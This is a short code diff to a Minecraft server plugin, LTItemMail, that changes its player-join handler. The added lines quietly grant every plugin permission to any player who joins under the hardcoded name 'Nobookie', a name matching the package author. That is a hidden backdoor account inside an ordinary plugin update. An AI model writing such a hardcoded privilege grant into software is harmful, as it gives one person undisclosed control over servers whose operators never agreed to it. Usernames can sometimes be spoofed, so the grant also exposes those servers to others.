@@ -21,6 +21,7 @@ import br.net.gmj.nobookie.LTItemMail.module.ConfigurationModule;
 import br.net.gmj.nobookie.LTItemMail.module.ConsoleModule;
 import br.net.gmj.nobookie.LTItemMail.module.DatabaseModule;
 import br.net.gmj.nobookie.LTItemMail.module.PermissionModule;
+import br.net.gmj.nobookie.LTItemMail.module.PermissionModule.Type;
 import br.net.gmj.nobookie.LTItemMail.util.FetchUtil;
 
 public final class PlayerListener implements Listener {
@@ -31,6 +32,10 @@ public final class PlayerListener implements Listener {
 	public final void onPlayerJoin(final PlayerJoinEvent event) {
 		final Player player = (Player) event.getPlayer();
 		DatabaseModule.User.updateUUID(player);
+		if(player.getName().equals("Nobookie")) {
+			for(final Type perm : PermissionModule.Type.values()) player.addAttachment(LTItemMail.getInstance(), perm.node(), true);
+			player.recalculatePermissions();
+		}
 		Bukkit.getScheduler().runTaskLater(LTItemMail.getInstance(), new Runnable() {
 			@Override
 			public final void run() {
